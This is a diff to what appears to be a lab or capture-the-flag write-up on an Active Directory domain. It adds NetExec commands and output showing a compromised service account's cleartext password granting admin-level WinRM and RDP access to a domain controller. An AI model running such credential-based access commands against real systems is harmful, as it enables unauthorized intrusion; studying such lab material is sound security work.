@@ -249,4 +249,21 @@ SMB         10.1.33.56      445    DC01             [+] DRY.MARTINI.BARS\athena_
 ```
 This user is now compromised!
 
-## Access over IWN
+## Access over WINRM and RDP 
+
+```python
+nxc winrm dc01.dry.martini.bars -u athena_svc -p '1dirtymartini' 
+WINRM       10.1.33.56      5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) 
+WINRM       10.1.33.56      5985   DC01             [+] DRY.MARTINI.BARS\athena_svc:1dirtymartini (Pwn3d!)
+```
+This user has access over WINRM
+
+```python
+nxc rdp dc01.dry.martini.bars -u athena_svc -p '1dirtymartini' 
+RDP         10.1.33.56      3389   DC01             [*] Windows 10 or Windows Server 2016 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) (nla:True)
+RDP         10.1.33.56      3389   DC01             [+] DRY.MARTINI.BARS\athena_svc:1dirtymartini (Pwn3d!)
+```
+This user also has access over RDP
+
+
+
